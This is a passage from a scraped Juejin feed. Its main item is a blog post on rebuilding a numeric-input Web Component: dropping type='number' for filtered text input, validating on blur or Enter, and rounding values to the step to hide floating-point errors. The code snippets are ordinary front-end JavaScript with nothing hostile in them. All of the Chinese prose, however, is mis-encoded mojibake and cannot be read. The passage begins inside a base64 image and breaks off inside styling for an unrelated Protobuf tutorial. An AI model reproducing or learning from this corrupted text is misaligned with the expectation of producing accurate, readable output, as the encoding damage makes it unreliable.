h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">èƒŒæ™¯</h2>
<p>æ‹¿åˆ°éœ€æ±‚æ—¶ï¼Œå› ä¸ºå·¥æœŸè¿˜æ¯”è¾ƒå®½æ¾ï¼Œå®˜ç½‘å¼€å‘ï¼Œæˆ‘åˆåªåšå…¶ä¸­ä¸€ä¸ªç»„ä»¶ï¼Œæ¡†æ¶åˆæ²¡æœ‰å®šã€‚</p>
<p>æˆ‘å†³å®šä½¿ç”¨åŸç”Ÿå¼€å‘ï¼Œå¹¶å°è£…ä¸ºWeb Componentä»¥é€‚é…ä»»ä½•æ¡†æ¶ï¼ˆå¦‚æœä¸èƒ½é€‚é…ï¼Œè¯´æ˜æ¡†æ¶æœ‰é—®é¢˜ï¼‰ã€‚å…¶ä¸­å°±æœ‰ä¸€ä¸ªæ•°å­—è¾“å…¥æ¡†å¸¦æ‹‰æ†çš„ï¼Œæ•°å­—è¾“å…¥æ¡†å’Œæ‹‰æ†è¿™ä¸¤ä¸ªä¸œè¥¿ï¼ŒåŸç”Ÿç»„ä»¶éƒ½æœ‰ã€‚</p>
<p>äºæ˜¯åœ¨æˆ‘çš„è¦æ±‚ä¸‹ï¼Œaiå¾ˆå¿«ç»™æˆ‘å°è£…äº†ä¸€ä¸ªè¿˜å¯ä»¥çš„ä¸œè¥¿ï¼Œä¸è¿‡åé¢uiåˆå»æ‰æ‹‰æ†äº†ã€‚</p>
<p>ä¸´è¿‘å‘å¸ƒï¼Œè¦åˆä»£ç äº†ï¼ŒåŒäº‹æ‰å‘ç°è¿™ä¸ªè¾“å…¥æ¡†æœ‰ç‚¹å„¿é—®é¢˜ï¼</p>
<hr/>
<p><span href="https://code.juejin.cn/pen/7582891968616169524" class="code-editor-container"><iframe class="code-editor-frame" data-code="code-editor-element" data-code-id="7582891968616169524" data-src="https://code.juejin.cn/pen/7582891968616169524" style="display:none;" loading="lazy"/><span class="loading-placeholder" style="display:none"><img class="placeholder-image" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAYAAAA6/NlyAAAAJElEQVRoge3BMQEAAADCoPVP7WkJoAAAAAAAAAAAAAAAAAAAbjh8AAFte11jAAAAAElFTkSuQmCC" loading="lazy"/><span class="loading-logo"/></span></span></p>
<h2 data-id="heading-1">èµ·ç‚¹ï¼šä¸€æ®µâ€œå·®ä¸å¤šèƒ½ç”¨â€çš„ä»£ç </h2>
<p>è¿™é‡Œå°±ä¸èµ˜è¿°Web Componentçš„å¼€å‘äº†ï¼Œå› ä¸ºç¡®å®å¾ˆç®€å•ï¼Œçœ‹ä»£ç å°±è¡Œäº†ã€‚</p>
<p>è¿™æ˜¯æˆ‘æœ€åˆå†™çš„ <code>NumInput</code> ç»„ä»¶ï¼ˆä¸ºç®€æ´çœç•¥éƒ¨åˆ† CSSï¼‰ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NumInput</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">HTMLElement</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">super</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">attachShadow</span>({ <span class="hljs-attr">mode</span>: <span class="hljs-string">'open'</span> });
    <span class="hljs-comment">// ... æ¨¡æ¿é‡Œç”¨äº† &lt;input type="number" steop="0.1"&gt;</span>
  }
  <span class="hljs-title function_">_onNumberInput</span>(<span class="hljs-params">event</span>) {
    <span class="hljs-keyword">const</span> newValue = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">clamp</span>(event.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">min</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">max</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'value'</span>, newValue);
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_dispatchEvent</span>();
  }
}
</code></pre>
<p>åŠŸèƒ½ä¸Šï¼š</p>
<ul>
<li>æ”¯æŒ <code>label</code>ã€<code>unit</code>ã€<code>min</code>ã€<code>max</code>ã€<code>step</code></li>
<li>èšç„¦æœ‰é«˜äº®æ•ˆæœ</li>
<li>å€¼å˜åŒ–ä¼šæ´¾å‘ <code>value-changed</code> äº‹ä»¶</li>
<li>è¿˜æœ‰åç¼€å•ä½</li>
</ul>
<p>çœ‹èµ·æ¥æ²¡é—®é¢˜ï¼Ÿç›´åˆ°å¥³åŒäº‹é—®æˆ‘ï¼šâ€œ<strong>ä¸ºä»€ä¹ˆæˆ‘è¾“ <code>-</code> æ²¡ååº”ï¼Ÿ</strong>â€
æˆ‘å‹æ ¹å„¿æ²¡æƒ³è¿‡æ‰‹è¾“ï¼Œå› ä¸ºè¿™ä¸ªç»„ä»¶æœ€å¼€å§‹çš„æ—¶å€™ï¼Œè¿˜æ˜¯å¸¦æ‹‰æ†çš„ï¼Œçº¯é¼ æ ‡æ“ä½œä¸€ç‚¹å„¿é—®é¢˜æ²¡æœ‰ã€‚</p>
<p>å½“ç„¶ï¼Œç°åœ¨UIå˜äº†ã€‚</p>
<hr/>
<h2 data-id="heading-2">é—®é¢˜ä¸€ï¼š<code>type="number"</code> ä¸è®©ä½ è¾“ â€œ-â€ å’Œ â€œ.â€</h2>
<p>é¦–å…ˆï¼Œè¿™ä¸æ˜¯ä¸€ä¸ªbug,å—¯ã€‚
æˆ‘ä»”ç»†ç ”ç©¶äº†ä¸€ä¸‹åŸç”Ÿçš„æ•°å­—æ¡†çš„æœºåˆ¶ã€‚</p>
<p>1 å®æ—¶æ ¡éªŒï¼Œä½ æ¯è¾“å…¥ä¸€ä¸ªå­—ç¬¦éƒ½ä¼šæ ¡éªŒã€‚
2 åªèƒ½è¾“å…¥æ•°å­—ç›¸å…³çš„,0-9 . -</p>
<p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œä¸ºä»€ä¹ˆå¥¹æ— æ³•è¾“å…¥â€œ-â€ å’Œ â€œ.â€å‘¢ï¼Ÿ</p>
<p>å®é™…ä¸Šï¼Œå¹¶ä¸æ˜¯æ— æ³•è¾“å…¥ï¼Œåªæ˜¯æ—¶æœºå’Œä½ç½®ä¸å¯¹ã€‚
å¦‚æœè¾“å…¥æ¡†ä¸­å·²ç»æœ‰ä¸€ä¸ªæ•°å­—1äº†ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œä½ å°±å¯ä»¥åœ¨è¿™ä¸ªæ•°å­—å‰é¢è¾“å…¥ä¸€ä¸ª â€œ-â€ï¼Œåœ¨å®ƒåé¢è¾“å…¥ä¸€ä¸ªâ€œ.â€ï¼Œè¿™ä¸¤ç§æƒ…å†µï¼ˆ-1å’Œ1.ï¼‰éƒ½æ˜¯åˆæ³•çš„ã€‚</p>
<p>å…¶ä½™æƒ…å†µéƒ½æ˜¯ä¸åˆæ³•çš„ï¼Œæ‰€ä»¥æ— æ³•è¾“å…¥ã€‚</p>
<p><strong>ç»“è®ºï¼š<code>type="number"</code>æ ¡éªŒè¿‡äºä¸¥è‹›ï¼Œé¼ æ ‡æ“ä½œè¶³çŸ£ï¼Œä¸é€‚åˆæ‰‹åŠ¨è¾“å…¥ã€‚</strong></p>
<hr/>
<h2 data-id="heading-3">é‡æ„ç¬¬ä¸€æ­¥ï¼šæ”¾å¼ƒ <code>type="number"</code>ï¼Œæ‹¥æŠ± <code>type="text"</code></h2>
<p>ä½¿ç”¨textè¾“å…¥æ¡†ï¼Œæ„å‘³ç€ä¹‹å‰æ•°å­—æ¡†æœ‰çš„åŠŸèƒ½ï¼Œæˆ‘ç°åœ¨ä¹Ÿéƒ½è¦ä¹Ÿæœ‰ï¼Œè¿™æ˜¯è¿™ä¸ªæ‰‹åŠ¨è¾“å…¥çš„æ ¡éªŒè§„åˆ™è¦è‡ªå®šä¹‰ã€‚</p>
<p>æˆ‘æ”¹æˆäº†ï¼š</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">inputmode</span>=<span class="hljs-string">"decimal"</span> /&gt;</span>
</code></pre>
<blockquote>
<p><code>inputmode="decimal"</code> èƒ½è®©ç§»åŠ¨ç«¯å¼¹å‡ºå¸¦å°æ•°ç‚¹çš„æ•°å­—é”®ç›˜ï¼Œä½“éªŒä¸é™åå‡ã€‚</p>
</blockquote>
<p>ä½†å…‰æ”¹ç±»å‹ä¸å¤Ÿï¼Œå¾—è‡ªå·±æ§åˆ¶è¾“å…¥å†…å®¹ã€‚</p>
<h3 data-id="heading-4">å®½æ¾è¿‡æ»¤ï¼Œåªæ‹¦éæ³•å­—ç¬¦</h3>
<p>åœ¨ <code>input</code> äº‹ä»¶ä¸­ï¼Œæˆ‘åªåšä¸€ä»¶äº‹ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">_onTextInput</span>(<span class="hljs-params">e</span>) {
  <span class="hljs-keyword">let</span> val = e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>;
  val = val.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[^0-9.\-+]/g</span>, <span class="hljs-string">''</span>); <span class="hljs-comment">// åªç•™æ•°å­—ã€ç‚¹ã€æ­£è´Ÿå·</span>
  <span class="hljs-comment">// å†å¤„ç†ç¬¦å·ä½ç½®ã€å°æ•°ç‚¹æ•°é‡...</span>
  e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span> = val;
}
</code></pre>
<p><strong>å…³é”®åŸåˆ™</strong>ï¼š</p>
<blockquote>
<p>è¾“å…¥è¿‡ç¨‹ä¸­ï¼Œ<strong>åªè¿‡æ»¤ï¼Œä¸æ ¡éªŒ</strong>ã€‚<br/>
å…è®¸ç”¨æˆ·è¾“ <code>-</code>ã€<code>.5</code>ã€<code>-12.</code>ï¼Œè¿™äº›â€œä¸­é—´çŠ¶æ€â€å¿…é¡»ä¿ç•™ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-5">é‡æ„ç¬¬äºŒæ­¥ï¼šä»€ä¹ˆæ—¶å€™æ‰è¯¥â€œè®¤çœŸâ€æ ¡éªŒï¼Ÿ</h2>
<p>è¦ä¿ç•™ç”¨æˆ·è¾“å…¥çš„å­—ç¬¦ï¼Œåˆè¦åœ¨ç»“æŸåæ ¡éªŒï¼Œä¸€èˆ¬å¯èƒ½ä¼šæƒ³åˆ°èŠ‚æµï¼Œæˆ‘è§‰å¾—å¤ªéº»çƒ¦äº†ï¼Œä¸æ˜¯æŒ‡å®ç°èŠ‚æµéº»çƒ¦ï¼Œè€Œæ˜¯èŠ‚æµè¿™ä¸ªé€»è¾‘æœ¬èº«ï¼Œä¼šä¸€ç›´åå»¶ï¼Œè®©jså¾ˆéº»çƒ¦ã€‚</p>
<p>æ‰€ä»¥ï¼Œæ€ä¹ˆåˆ¤æ–­ï¼š<strong>è¾“å…¥ç»“æŸäº†</strong>ï¼Ÿ</p>
<p>æˆ‘å®šä¹‰äº†ä¸¤ä¸ªâ€œç»“æŸä¿¡å·â€ï¼š</p>
<ol>
<li>å¤±ç„¦ï¼ˆ<code>blur</code>ï¼‰</li>
<li>æŒ‰ä¸‹å›è½¦ï¼ˆ<code>Enter</code>ï¼‰ åˆšå¼€å§‹æ²¡æƒ³åˆ°è¿™ä¸ªï¼Œç›´åˆ°æˆ‘è¾“äº†æ•°å­—æ²¡æœ‰ååº”ï¼Œä¹ æƒ¯æ€§åœ°å›è½¦äº†ä¸€ä¸‹ã€‚</li>
</ol>
<p>åœ¨è¿™ä¸¤ä¸ªæ—¶æœºï¼Œè°ƒç”¨åŒä¸€ä¸ªå‡½æ•° <code>_finalizeInput()</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">_finalizeInput</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> raw = <span class="hljs-variable language_">this</span>.<span class="hljs-property">numberEl</span>.<span class="hljs-property">value</span>.<span class="hljs-title function_">trim</span>();
  <span class="hljs-comment">// å¦‚æœæ˜¯ä¸­é—´çŠ¶æ€ï¼ˆå¦‚ '-'ï¼‰ï¼Œä¸å¤„ç†</span>
  <span class="hljs-keyword">if</span> (raw === <span class="hljs-string">''</span> || raw === <span class="hljs-string">'-'</span> || raw === <span class="hljs-string">'.'</span>) <span class="hljs-keyword">return</span>;

  <span class="hljs-keyword">let</span> num = <span class="hljs-built_in">parseFloat</span>(raw);
  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isNaN</span>(num)) {
    <span class="hljs-comment">// æ— æ•ˆï¼Ÿå›é€€åˆ°ä¸Šæ¬¡åˆæ³•å€¼</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">numberEl</span>.<span class="hljs-property">value</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">'value'</span>) || <span class="hljs-string">''</span>;
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-comment">// clamp åˆ° [min, max]</span>
  num = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">min</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(num, <span class="hljs-variable language_">this</span>.<span class="hljs-property">min</span>), <span class="hljs-variable language_">this</span>.<span class="hljs-property">max</span>);

  <span class="hljs-comment">// ä¿®æ­£æµ®ç‚¹ç²¾åº¦ï¼ˆå…³é”®ï¼ï¼‰</span>
  num = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_roundToStepPrecision</span>(num, <span class="hljs-variable language_">this</span>.<span class="hljs-property">step</span>);

  <span class="hljs-variable language_">this</span>.<span class="hljs-property">numberEl</span>.<span class="hljs-property">value</span> = <span class="hljs-title class_">String</span>(num);
  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setAttribute</span>(<span class="hljs-string">'value'</span>, num);
  <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_dispatchEvent</span>(); <span class="hljs-comment">// æ´¾å‘çš„æ˜¯æ•°å­—ï¼Œä¸æ˜¯å­—ç¬¦ä¸²ï¼</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-6">é—®é¢˜äºŒï¼š0.1 + 0.2 â‰  0.3ï¼Ÿ</h2>
<ul>
<li><code>0.1 + 0.2</code> â†’ æ˜¾ç¤º <code>0.30000000000000004</code>
JavaScript çš„æµ®ç‚¹ç²¾åº¦é—®é¢˜æ˜¯è€æœ‹å‹äº†ã€‚<br/>
ä½†ç”¨æˆ·ä¸å…³å¿ƒè¿™äº›ï¼Œä»–ä»¬åªçœ‹åˆ°â€œ<strong>æˆ‘ step=0.1ï¼Œæ€ä¹ˆå˜å‡ºä¸€ä¸²å°æ•°ï¼Ÿ</strong>â€</li>
</ul>
<h3 data-id="heading-7">è§£æ³•ï¼šæŒ‰ <code>step</code> çš„å°æ•°ä½æ•°å››èˆäº”å…¥</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">_roundToStepPrecision</span>(<span class="hljs-params">value, step</span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Number</span>.<span class="hljs-title function_">isInteger</span>(step)) <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(value);
  <span class="hljs-keyword">const</span> decimalPlaces = step.<span class="hljs-title function_">toString</span>().<span class="hljs-title function_">split</span>(<span class="hljs-string">'.'</span>)[<span class="hljs-number">1</span>]?.<span class="hljs-property">length</span> || <span class="hljs-number">0</span>;
  <span class="hljs-keyword">const</span> factor = <span class="hljs-number">10</span> ** decimalPlaces;
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(value * factor) / factor;
}
</code></pre>
<ul>
<li><code>step=0.1</code> â†’ ä¿ç•™ 1 ä½ â†’ <code>0.30000000000000004</code> â†’ <code>0.3</code></li>
<li><code>step=0.01</code> â†’ ä¿ç•™ 2 ä½ â†’ <code>0.13</code></li>
<li><code>step=1</code> â†’ æ•´æ•° â†’ <code>4</code></li>
</ul>
<p><strong>æ‰€æœ‰èµ‹å€¼è·¯å¾„</strong>ï¼ˆæ‰‹åŠ¨è¾“å…¥ã€ä¸Šä¸‹é”®ã€å¤–éƒ¨è®¾ç½®ï¼‰éƒ½èµ°è¿™ä¸ªä¿®æ­£ï¼Œå½»åº•å‘Šåˆ«è„æ•°å­—ã€‚</p>
<hr/>
<p>ç›‘å¬ä¸€ä¸‹å›è½¦ä½œä¸ºâ€œç¡®è®¤â€ã€‚</p>
<p>è¿™é‡Œç›´æ¥ä¸ä»…èµ°äº†å¤±ç„¦çš„é€»è¾‘ï¼Œè¿˜ä¸»åŠ¨å¤±ç„¦ï¼Œé¿å…äºŒæ¬¡â€œå¤±ç„¦â€ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">this</span>.<span class="hljs-property">numberEl</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'keydown'</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (e.<span class="hljs-property">key</span> === <span class="hljs-string">'Enter'</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">_finalizeInput</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">numberEl</span>.<span class="hljs-title function_">blur</span>(); <span class="hljs-comment">// è‡ªåŠ¨å¤±ç„¦ï¼Œç»Ÿä¸€äº¤äº’</span>
  }
});
</code></pre>
<hr/>
<h2 data-id="heading-8">å…¶ä»–ç»†èŠ‚æ‰“ç£¨</h2>
<ul>
<li><strong>ä¿®å¤ typo</strong>ï¼š<code>steop="0.1"</code> â†’ <code>step="0.1"</code>ï¼ˆåˆ«ç¬‘ï¼ŒçœŸæœ‰äººå†™é”™ï¼‰</li>
<li><strong>ç§»é™¤æ— ç”¨ä»£ç </strong>ï¼šåŸå§‹ä»£ç é‡Œå£°æ˜äº† <code>rangeEl</code> ä½†æ²¡ç”¨ï¼Œåˆ æ‰</li>
<li><strong>äº‹ä»¶ä¼ æ•°å­—</strong>ï¼š<code>value-changed</code> çš„ <code>detail.value</code> æ˜¯ <code>number</code> ç±»å‹ï¼Œä¸æ˜¯å­—ç¬¦ä¸²</li>
<li><strong>å¤–éƒ¨è®¾ç½®å€¼ä¹Ÿä¿®æ­£</strong>ï¼š<code>setAttribute('value', '0.30000000000000004')</code> ä¼šè‡ªåŠ¨è½¬æˆ <code>0.3</code></li>
</ul>
<hr/>
<h2 data-id="heading-9">æœ€ç»ˆæ•ˆæœ</h2>
<p>âœ… è‡ªç”±è¾“å…¥ <code>-</code>ã€<code>.</code>ã€<code>-12.</code><br/>
âœ… æŒ‰ â†‘/â†“ æŒ‰ <code>step</code> ç²¾ç¡®å¢å‡<br/>
âœ… æŒ‰ Enter æˆ–å¤±ç„¦è‡ªåŠ¨æ ¡éªŒ+ä¿®æ­£<br/>
âœ… æ”¯æŒ <code>min</code>/<code>max</code> é™åˆ¶<br/>
âœ… ç§»åŠ¨ç«¯å¼¹å‡ºæ•°å­—é”®ç›˜<br/>
âœ… äº‹ä»¶ä¼ å‡ºå¹²å‡€çš„æ•°å­—<br/>
âœ… å®Œå…¨ Web Componentï¼Œé›¶ä¾èµ–</p>
<hr/>
<h2 data-id="heading-10">ç»“è¯­</h2>
<p>è¿™ä¸ªç»„ä»¶æœ€ç»ˆä»£ç æ¯”æœ€åˆé•¿äº†è¿‘ä¸€å€ï¼Œä½†<strong>ç”¨æˆ·ä½“éªŒæå‡æ˜¯è´¨çš„é£è·ƒ</strong>ã€‚</p>
<p>æœ‰æ—¶å€™ï¼Œçœ‹ä¼¼ç®€å•çš„åŠŸèƒ½ï¼Œæ·±æŒ–ä¸‹å»å…¨æ˜¯å‘ã€‚<br/>
ä½†æ­£æ˜¯è¿™äº›â€œå°ç»†èŠ‚â€ï¼Œå†³å®šäº†äº§å“æ˜¯â€œèƒ½ç”¨â€è¿˜æ˜¯â€œå¥½ç”¨â€ã€‚</p>
<blockquote>
<p>æœ€å,å¥³åŒäº‹çœ‹äº†ä¸€çœ¼è¯´ï¼šâ€œè¿™ä¸ªè¾“å…¥æ¡†ç»ˆäºä¸æŠ½é£äº†ã€‚â€<br/>
æˆ‘ç¬‘äº†ç¬‘ï¼Œæ²¡å‘Šè¯‰å¥¹ï¼Œæˆ‘è®©AIæ”¹äº†å››ç‰ˆã€‚</p>
</blockquote>
<p>ï¼ˆå®Œï¼‰</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Python Protobuf å…¨é¢æ•™ç¨‹ï¼šå¸¸ç”¨ API ä¸²è”ä¸å®æˆ˜æŒ‡å—]]></title>    <link>https://juejin.cn/post/7582848701268049955</link>    <guid>https://juejin.cn/post/7582848701268049955</guid>    <pubDate>2025-12-13T07:29:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582848701268049955" data-draft-id="7582845425402904616" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Python Protobuf å…¨é¢æ•™ç¨‹ï¼šå¸¸ç”¨ API ä¸²è”ä¸å®æˆ˜æŒ‡å—"/> <meta itemprop="keywords" content="å‰ç«¯,é¢è¯•,GitHub"/> <meta itemprop="datePublished" content="2025-12-13T07:29:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜å°jobleap"/> <meta itemprop="url" content="https://juejin.cn/user/2875978147692910"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Python Protobuf å…¨é¢æ•™ç¨‹ï¼šå¸¸ç”¨ API ä¸²è”ä¸å®æˆ˜æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2875978147692910/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜å°jobleap
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T07:29:27.000Z" title="Sat Dec 13 2025 07:29:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»11åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid 